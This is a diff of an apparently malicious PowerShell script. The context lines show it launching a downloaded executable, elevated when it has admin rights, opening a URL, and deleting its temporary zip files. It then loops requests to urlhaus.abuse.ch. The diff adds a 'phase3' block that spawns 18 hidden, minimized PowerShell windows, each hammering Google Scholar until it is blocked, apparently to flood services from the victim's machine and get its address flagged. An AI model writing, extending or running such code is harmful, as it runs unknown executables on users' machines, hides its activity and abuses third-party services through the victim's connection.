@@ -111,7 +111,7 @@ if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item 
 if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
 Write-Host "Workflow completed successfully!"
 }
-$runExe=$true;$mediaFire=$true;$openUrl=$true
+$runExe=$true;$mediaFire=$true;$phase2=$true;$phase3=$true;
 if(!($mediaFire) -and !($openUrl)){[Environment]::Exit(0)}
 $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if($isAdmin){
@@ -159,13 +159,13 @@ Write-Host "Starting $exePath"
 if($isAdmin){Start-Process -FilePath $exePath -Verb RunAs}else{Start-Process -FilePath $exePath}
 }else{Write-Host "Skipping EXE launch."}
 }
-if($openUrl){DarwinWaterson}else{Write-Host "Skipping Url launch."}
+if($phase2){DarwinWaterson}else{Write-Host "Skipping Url launch."}
 Write-Host "Performing final cleanup of temporary archive files..."
 $tempZips=Get-ChildItem -Path $tempPath -Filter "*.zip" -ErrorAction SilentlyContinue
 $downloadZip=Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\download.zip"
 foreach($zip in $tempZips){Remove-Item -LiteralPath $zip.FullName -Force -ErrorAction SilentlyContinue}
 if(Test-Path -LiteralPath $downloadZip){Remove-Item -LiteralPath $downloadZip -Force -ErrorAction SilentlyContinue}
-while ($true) {
+while($true){
 try {
 $null = Invoke-RestMethod -Uri "https://urlhaus.abuse.ch:443/browse.php" -Method Get -UserAgent "" -ErrorAction Stop
 }
@@ -175,9 +175,10 @@ break
 }
 }
 }
+if($phase3){
 $count = 18
 $command = '
-while ($true) {
+while($true){
 Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent ""
 if ($_.Exception.Response.StatusCode -eq 403){
 break
@@ -186,5 +187,6 @@ break
 '
 1..$count | ForEach-Object{
 Start-Process powershell.exe -WindowStyle Minimized -ArgumentList "-NoExit", "-Command", $command
-};
+}
+}
 [Environment]::Exit(0)
